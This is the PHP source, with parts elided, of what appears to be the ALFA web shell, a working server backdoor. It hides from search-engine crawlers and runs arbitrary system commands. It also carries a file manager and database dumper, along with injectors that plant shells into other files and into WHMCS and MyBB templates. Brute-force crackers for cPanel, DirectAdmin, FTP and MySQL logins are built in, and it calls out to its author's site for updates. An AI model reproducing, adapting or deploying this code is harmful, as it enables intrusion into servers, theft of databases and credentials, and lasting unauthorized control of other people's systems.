...
/*
	...
	Telegram: 	https://telegram.me/solevisible1
...
if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
{
    function vcnvSCZgBz($data)
    {
        ...
        while ($i < strlen((string) $data));
        $enc = implode('', $tmp_arr);
        $r = (strlen((string) $data) % 3);
        return ($r !== 0 ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
    }
    function charCodeAt($data, $char): int
    {
        return ord(substr((string) $data, $char, 1)[0]);
    }
    function charAt($data, $char): string
    {
        return substr((string) $data, $char, 1);
    }
}
else
{
    function vcnvSCZgBz($s): string
    {
...
{
    function zRtSHsbTzV($input): ?string
    {
...
{
    function zRtSHsbTzV($s): string|false
    {
...
if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = ["Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider"];if(preg_match('/'.implode('|',$userAgents).'/i',(string) $_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
...
define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true));
...
$GLOBALS['__file_path'] = str_replace('\\','/',trim((string) preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
$config = ['AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']];
//@session_start();
@session_write_close();
...
if(@$_POST["usrname"]==$config['AlfaUser'] && @md5((string) $_POST["password"])==$config['AlfaPass']){
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.org/images/alfa-iran.png" /></center>
...
if(@md5((string) $_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if (isset($_COOKIE["alfacgiapi"]) && !@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")) {
            $recreate = true;
            $lang = $_COOKIE["alfacgiapi"];
        }
		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
			@chdir(dirname((string) $_SERVER["SCRIPT_FILENAME"]));
		...
		if($is_curl){
			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname((string) $_SERVER["REQUEST_URI"])."/".$cgi_url;
			$post = new AlfaCURL();
			$data = $post->Send($address, "post", $cmd);
		}elseif($is_socket){
			$server = $_SERVER["SERVER_NAME"];
			$uri = dirname((string) $_SERVER["REQUEST_URI"])."/".$cgi_url;
			$data = _alfa_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(str_contains((string) $data, "[solevisible~api]") && !str_contains((string) $data, '[solevisible~api]<pre>"+output+"</pre>')){
			if($set_cookie){
				__alfa_set_cookie("alfacgiapi", $lang);
			}
			if(@preg_match("/<pre>(.*?)<\/pre>/s", (string) $data, $res)){
				$out = $res[1];
			}
		}elseif($lang=="perl"){
...
function alfaGetCwd(): string|false{
...
function alfaEx($in,$re=false,$cgi=true,$all=false){
	...
	if((empty($data) && $cgi || $all) && $GLOBALS['sys'] == 'unix'){
		if((string) _alfa_php_cmd("whoami") === ''||$all){
				$cmd = _alfa_cgicmd($in);
				if(!empty($cmd)){
					return $cmd;
				}
...
$pipes = [];
$process = @proc_open($in.' 2>&1', [["pipe","w"], ["pipe","w"], ["pipe","w"]], $pipes);
...
function _alfa_fsockopen($server,$uri,$post): string{
	...
	if($socket){
		...
		$http .= "Content-length: " . strlen((string) $post) . "\r\n";
...
$r = $safe_mode ? "<b style='color: red'>On</b>" : "<b style='color: green'>Off</b>";
...
echo sprintf("<b style='color: #7CFC00'>Safe Mode : %s<br>", $r);
echo"<font color=#7CFC00>Disable functions : </font>";
$disfun = @ini_get('disable_functions');
if(in_array($disfun, ['', '0', false], true)){$disfun = '<font color="green">NONE</font>';}
echo"<font color=red>";
echo $disfun;
echo"</font><br>";
...
$separator = strtolower(substr(PHP_OS,0,3)) == "win" ? '&' : ';';
...
if($GLOBALS['cwd'][strlen((string) $GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (['TMP', 'TEMP', 'TMPDIR'] as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
if(!function_exists("mb_strlen")){
	function mb_strlen($str, $c=""): int{
		return strlen((string) $str);
	}
}
if(!function_exists("mb_substr")){
	function mb_substr($str, $start, $end, $c=""): string{
...
if(!isset($_POST['ajax'])){
function Alfa_GetDisable_Function(): string{
$disfun = @ini_get('disable_functions');
$afa = '<span class="header_show_all">All Functions Accessible</span>';
if(in_array($disfun, ['', '0', false], true))return($afa);
$s = explode(',',$disfun);
$s = array_unique($s);
$i=0;
$b=0;
...
$ssh2 = function_exists('ssh2_connect') ? $on : $of;
$curl = function_exists('curl_version') ? $on : $of;
$mysql = function_exists('mysql_get_client_info') || class_exists('mysqli') ? $on : $of;
$mssql = function_exists('mssql_connect') ? $on : $of;
$pg = function_exists('pg_connect') ? $on : $of;
$or = function_exists('oci_connect') ? $on : $of;
$disfun = @ini_get('disable_functions') ?: "All Functions Enable";
$safe_modes = @ini_get('safe_mode') ? "<span class='header_off'>ON</span>" : "<span class='header_on'>OFF</span>";
$cgi_shell="<span class='header_off' id='header_cgishell'>OFF</span>";
if(@ini_get('open_basedir')){
$basedir_data = @ini_get('open_basedir');
$open_b = strlen($basedir_data) > 120 ? substr($basedir_data,0, 120)."..." : $basedir_data;
}else{$open_b=$none;}
$safe_exe = @ini_get('safe_mode_exec_dir') ?: $none;
$safe_include = @ini_get('safe_mode_include_dir') ?: $none;
...
$cwd_links = '';
$path = explode("/", (string) $GLOBALS['cwd']);
$n=count($path);
for($i=0; $i<$n-1; $i++) {
...
$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : ((string) $cmd_uname !== ''?$cmd_uname:'( php_uname ) Function Disabled !');
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.org/images/alfa-iran.png" /></td>
</tr>
<tr>
...
<td><b>'.(@$_SERVER["SERVER_ADDR"] ?: (function_exists("gethostbyname") ? @gethostbyname($_SERVER['SERVER_NAME']) : '????')).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
</tr>
<tr>
...
if(@strstr((string) $d0main,"zone")){
preg_match_all('#zone "(.*)"#', (string) $d0main, $domains);
flush();
...
if((string) alfaEx("id",false,false) !== ''){
...
$quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" || $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
echo '<tr>
...
<ul>
';
$li = ['proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
...
function alfalogout(): void{
@setcookie("AlfaUser", '', ['expires' => 2012]);
@setcookie("AlfaPass", '', ['expires' => 2012]);
unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
echo("ok");
}
function showAnimation($name): string{
...
function __showicon($r): string{
	$s['btn']='http://solevisible.org/images/btn.png';
	$s['alfamini']='http://solevisible.org/images/alfamini.png';
	$s['loader']='http://solevisible.org/images/loader.svg';
	//return 'data:image/png;base64,'.__get_resource($s[$r]);
	return $s[$r];
}
function alfainbackdoor(): void{
alfahead();
...
if($_POST['alfa1']=='file'){
echo(sprintf("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">%s <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='%s'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>%s</form></p></center>", $select, $cwd, $textarea));
if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa4']!=''){
$method = $_POST['alfa2'];
$file = $_POST['alfa3'];
$shell = $_POST['alfa4'];
$key = str_replace(['"',"'"],'',trim((string) $_POST['alfa5']));
if($key=='')$key='alfa';
$shell = $method == 'my' ? __ZW5jb2Rlcg($shell) : $GLOBALS['__ALFA_SHELL_CODE'];
...
$table = ['td1' =>
['color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],
'td2' =>
['color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],
'td3' =>
['color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],
'td4' =>
['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],
'td5' =>
['color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true],
'td6' =>
['color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50']
];
create_table($table);
echo(sprintf('<p>%s</p>', $select));
echo($textarea);
...
$method = $_POST['alfa7'];
$shell = $_POST['alfa8'];
$key = str_replace(['"',"'"],'',trim((string) $_POST['alfa9']));
if($key=='')$key='alfa';
$shell = $method == 'my' ? __ZW5jb2Rlcg($shell) : $GLOBALS['__ALFA_SHELL_CODE'];
...
$site = str_replace(['http://','https://','www.','ftp://'],'',$_POST['alfa1']);
...
if(!preg_match("/[a-z]+:\/\/.+/",(string) $url)) return false;
$saveas = basename(rawurldecode((string) $url));
...
if(@is_file($saveas)) return true;
alfaEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
alfaEx("fetch -o ".$saveas." -p ".$url);
return @is_file($saveas);
}
function clean_string($string): string|false{
...
if(in_array($content, ['', '0', false], true)||!$content){
	return alfaEx("cat '".addslashes((string) $file)."'");
}
return $content;
}
function alfaMarket(): void{
echo "<div class='header'>";
$curl = new AlfaCURL();
$content = $curl->Send("http://solevisible.org/market.php");
...
$lg_array = ["gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound"];
...
$password = md5((string) $_POST['alfa4']);
$icon = $_POST['alfa6'];
$post_encrypt = $_POST['alfa7'];
$cgi_api_val = $_POST['alfa9'];
@chdir($GLOBALS['home_cwd']);
$basename = @basename((string) $_SERVER['PHP_SELF']);
...
if(preg_match($find_user,$data,$e)){
...
$template = '<tr><td style="text-align:center;"><a href="http://solevisible.org/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
$x = 1;
foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
	$multi = "";
	if(is_array($value) && isset($value["multi_selector"])){
		$multi = __ZW5jb2Rlcg(json_encode($value));
	}
	$value = alfa_getColor($key);
	$help = strtolower(str_replace([":", "+"], ["_", "_plus"], $key));
	echo str_replace(["{index}", "{target}", "{color}", "{multi}", "{help}"], [$x++, $key, $value, $multi, $help], $template);
}
...
if($_POST['alfa2']=='>>'){
	echo __pre();
	$colors = json_decode((string) $_POST["alfa1"],true);
	$array = "";
	$is_default = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1";
	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim((string) $colors[$k]);
...
function alfaaboutus(): void{
alfahead();
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("http://solevisible.org/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='http://solevisible.org/images/farvahar-iran.png'><br>
...
<font color='#00A220'>Telegram Channel: @solevisible1</font><br>
...
$selected_data = json_decode((string) $_POST['alfa2'], true);
$username = ($_POST['alfa3']);
...
$host = ($_POST['alfa7']);
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $username, 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $password, 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $dbname, 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars((string) $GLOBALS['cwd']), 'inputSize' => '50']
];
create_table($table);
...
$table = ['td1' =>
 ...
 ['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars((string) $GLOBALS['cwd']).'alfa.sql', 'inputSize' => '50']
];
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$username = ($_POST['alfa3']);
...
if((string) alfaEx("mysqldump") !== ''){
alfaEx(sprintf("mysqldump --single-transaction --host=\"%s\" --user=\"%s\" --password=\"%s\" %s > '", $host, $username, $password, $dbname).addslashes((string) $dfile)."'");
echo($msg);
}else{
__alert("Error...!");
}
...
function Alfa_DirectAdmin_Cracker(array $info): void{
if(!$info['mysql'])
...
if ($curl_errno > 0) {echo sprintf("<font color='red'>Error: %s</font><br>", $curl_error);}
...
function Alfa_CP_Cracker(array $info): void{
...
function Alfa_FTP_Cracker(array $info): void{
...
function Alfa_Mysql_Cracker(array $info): void{
if(@mysqli_connect($info['target'].':'.$info['port'],$info['username'],$info['password'])){
CrackerResualt($info);
echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
}
}
function Alfa_FTPC(array $info): void{
if (($con = @ftp_connect($info['target'],$info['port'])) && $con) {
    $login=@ftp_login($con,$info['username'],$info['password']);
    if($login){CrackerResualt($info);}
}
@ftp_close($con);
}
function CrackerResualt(array $info): void{
...
switch($method){case 'cp':return Alfa_CP_Cracker($info);case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($info);case 'ftp':return Alfa_FTP_Cracker($info);case 'mysql':return Alfa_Mysql_Cracker($info);case 'mysql':return Alfa_FTPC($info);}
}
function alfaCrackers(): void{
alfahead();
AlfaNum(9,10);
...
foreach(['cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()'] as $key=>$val)echo('<option value="'.$key.'">'.$val.'</option>');
echo '</select> Protocol: <select id="protocol" name="protocol">';
foreach(['https://','http://','ftp://'] as $val)echo('<option value="'.$val.'">'.$val.'</option>');
...
$target = str_replace(['https://','http://','ftp://'],'',$_POST['alfa1']);
$port = $_POST['alfa2'];
...
$p = $loginpanel == 'phpmyadmin' && ($p = true);
if($cracking=='start'){
echo __pre();
$exuser = explode("\n",$usernames);
$expw = explode("\n",$passwords);
...
foreach($expw as $pw){
$array = ['username' => trim($user),'password' => trim($pw),'port' => trim((string) $port),'target' => trim($target),'protocol' => trim((string) $protocol),'fcrack' => trim((string) $fcrack),'mysql' => $p];
...
function output($string): void{ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
function alfaShellInjectors(): void{
alfahead();
echo '<div class=header>';
AlfaNum(11);
...
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db User : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50']
];
create_table($table);
echo $selector;
...
mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") || die (mysqli_error($conn));
$inject = sprintf("UPDATE tblemailtemplates SET message='%s' WHERE name='Password Reset Validation'", $newindex);
...
$getToken = preg_match('/name="token" value="(.*?)"/i',(string) $saveurl,$token);
$AlfaSole->Send($path."/pwreset.php","post",sprintf('token=%s&action=reset&email=solevisible@fbi.gov', $token[1]));
$backdata = sprintf("UPDATE tblemailtemplates SET message='%s' WHERE name='Password Reset Validation'", $tempSave);
...
";
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id'=>'db_name' ,'inputValue' => '', 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'dbu', 'id'=>'db_user', 'inputValue' => '', 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'dbp', 'id'=>'db_pw', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id'=>'db_prefix','inputValue' => 'mybb_', 'inputSize' => '50']
];
create_table($table);
echo $selector;
...
$inject = sprintf("select template from %stemplates where  title= 'calendar'", $prefix);
$result = mysqli_query($conn, $inject) or die (mysqli_error($conn));
...
$createShell = sprintf("update %stemplates SET template= '", $prefix).$newinshell.$repsave."' where title = 'calendar'";
$result2 = mysqli_query($conn,$createShell) or die (mysqli_error($conn));
$geturl = sprintf("select value from %ssettings where name= 'bburl'", $prefix);
...
@fwrite($fsock, "GET {$realpath}/calendar.php HTTP/1.1\r\n");
@fwrite($fsock, "HOST: {$realurl}\r\n");
@fwrite($fsock, "Connection: close\r\n\r\n");
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$repairdbtemp = sprintf("update %stemplates SET template= '%s' where title = 'calendar'", $prefix, $repsave);
...
$table = ['td1' =>
 ['color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'],
 'td2' =>
 ['color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id'=>'db_name','inputValue' => '', 'inputSize' => '50'],
 'td3' =>
 ['color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'user', 'id'=>'db_user','inputValue' => '', 'inputSize' => '50'],
 'td4' =>
 ['color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'pass', 'id'=>'db_pw','inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id'=>'db_prefix','inputValue' => '', 'inputSize' => '50']
];
create_table($table);
echo $selector;
...
if($faq_name == "header" && str_ends_with($saveval, "/core")){
...
if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
@fwrite($fsock, "GET {$realpath}.{$faq_file} HTTP/1.1\r\n");
@fwrite($fsock, "HOST: {$realurl}\r\n");
@fwrite($fsock, "Connection: close\r\n\r\n");
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
...
function alfacheckfiletype(): void{
	$path = $_POST['path'];
	$arg = $_POST['arg'];
	if(@is_file($path.'/'.$arg)){
		echo("file");
...
function alfacheckupdate(): void{
	if ($GLOBALS["DB_NAME"]["cgi_api"] && (!isset($_COOKIE["alfacgiapi_mode"]) && !isset($_COOKIE["alfacgiapi"]))) {
        _alfa_cgicmd("whoami","perl",true);
        if((string) alfaEx("whoami",false,true) !== ''){
				__alfa_set_cookie("alfa_canruncmd", "true");
			}
    }
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://solevisible.org/update.json?ver=".__ALFA_VERSION__);
		$json = @json_decode((string) $json,true);
		$data = [];
		if($json){
			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"]) && $json["type"] == "update"){
				if(__ALFA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
						@setcookie("alfa_checkupdate", "1", ['expires' => time()+86400]);
...
function alfaWriteTocgiapi($name, $source): string|false{
	$temp = "";
	$not_api = ["basedir.alfa", "getdir.alfa", "getheader.alfa"];
...
function alfacheckcgi(): void{if((string) alfaEx("id",false,true,true) !== '')echo("ok");else echo("no");}
function alfaupdateheader(): void{
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$realdir = addslashes(dirname((string) $_SERVER["SCRIPT_FILENAME"]));
		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
		$data = alfaEx(sprintf("cd '%s/alfacgiapi';sh getheader.alfa", $tmp_path),false,true,true);
		if(@is_array(@json_decode((string) $data,true))){
...
function __alert($s): void{
echo '<center>'.__pre().$s.'</center>';
}
function create_table($data): void{
echo '<table border="1">';
foreach ($data as $val){
$array = [];
foreach($val as $k => $v){
...
if($_POST['alfa1']=='dec'){
$algorithms = ['md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM'];
...
if(!str_starts_with((string) $resp, 'CODE')&&$resp!=''){
echo "<b>Result: <font color='green'>".$resp."</font></b>";
}elseif(!str_starts_with((string) $resp, 'CODE')){
...
if(!empty($hash)){
$curl = new AlfaCURL();
$resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post",sprintf('hash=%s&crypt=Search', $hash));
echo(__pre().'<center>');
if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',(string) $resp,$s)){
...
<tr>
<td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars((string) $GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.org/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"http://solevisible.org/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"http://solevisible.org/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"http://solevisible.org/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"http://solevisible.org/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.org/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"http://solevisible.org/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.org/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.org/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.org/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.org/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.org/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.org/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.org/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"http://solevisible.org/icons/menu/delete.svg\"> Delete</a>
</div>
...
$i .= ((($p & 0x0100) !== 0) ? 'r​' : '-');
$i .= ((($p & 0x0080) !== 0) ? 'w​' : '-');
$i .= ((($p & 0x0040) !== 0) ? ((($p & 0x0800) !== 0) ? 's​' : 'x​' ) : ((($p & 0x0800) !== 0) ? 'S​' : '-'));
$i .= ((($p & 0x0020) !== 0) ? 'r​' : '-');
$i .= ((($p & 0x0010) !== 0) ? 'w​' : '-');
$i .= ((($p & 0x0008) !== 0) ? ((($p & 0x0400) !== 0) ? 's​' : 'x​' ) : ((($p & 0x0400) !== 0) ? 'S​' : '-'));
$i .= ((($p & 0x0004) !== 0) ? 'r​' : '-');
$i .= ((($p & 0x0002) !== 0) ? 'w​' : '-');
$i .= ((($p & 0x0001) !== 0) ? ((($p & 0x0200) !== 0) ? 't​' : 'x​' ) : ((($p & 0x0200) !== 0) ? 'T​' : '-'));
return $i;
}
function alfaPermsColor(array $f,$isbash=false): string{
$class = "";
$num = "";
$human = "";
if($isbash){
...
function _alfa_can_runCommand($cgi=true,$cache=true): bool{
	if(isset($_COOKIE["alfa_canruncmd"])&&$cache){
		return true;
	}
	if((string) alfaEx("whoami",false,$cgi) !== ''){
		$_COOKIE["alfa_canruncmd"] = true;
		return true;
	}
	return false;
}
function _alfa_symlink($target, $link): void{
	$phpsym = function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
		alfaEx("ln -s '".addslashes((string) $target)."' '".addslashes((string) $link)."'");
	}
}
function _alfa_file_exists($file,$cgi=true): bool{
	if(@file_exists($file)){
		return true;
	}
	return (string) alfaEx("ls -la '".addslashes((string) $file)."'",false,$cgi) !== '';
}
function _alfa_file($file,$cgi=true): array|false{
	$array = @file($file);
	if(!$array){
		if((string) alfaEx("id",false,$cgi) !== ''){
			$data = alfaEx('cat "'.addslashes((string) $file).'"',false,$cgi);
			if((string) $data !== ''){
				return explode("\n", (string) $data);
			}
            return false;
...
function _alfa_is_writable($file){
	...
	if (!$check && _alfa_can_runCommand()) {
        $check = alfaEx('[ -w "'.trim(addslashes((string) $file)).'" ] && echo "yes" || echo "no"');
        $check = $check == "yes";
    }
	return $check;
}
function _alfa_is_dir($dir,$mode="-d"){
	...
	if (!$check && _alfa_can_runCommand()) {
        $check = alfaEx('[ "'.trim((string) $mode).'" "'.trim(addslashes((string) $dir)).'" ] && echo "yes" || echo "no"');
        return $check == "yes";
    }
	return $check;
}
function _alfa_load_ace_options($base): string{
...
function copy_paste($c,$s,$d): void{
if(@is_dir($c.$s)){
@mkdir($d.$s);
$h = @opendir($c.$s);
...
function alfaCmp(array $a, array $b): int {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower((string) $a[$GLOBALS['sort'][0]]), strtolower((string) $b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
function alfaFilesMan(): void{
...
if($move_cmd_file&&$alfa_canruncmd){
	alfaEx("cat '".addslashes((string) $file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
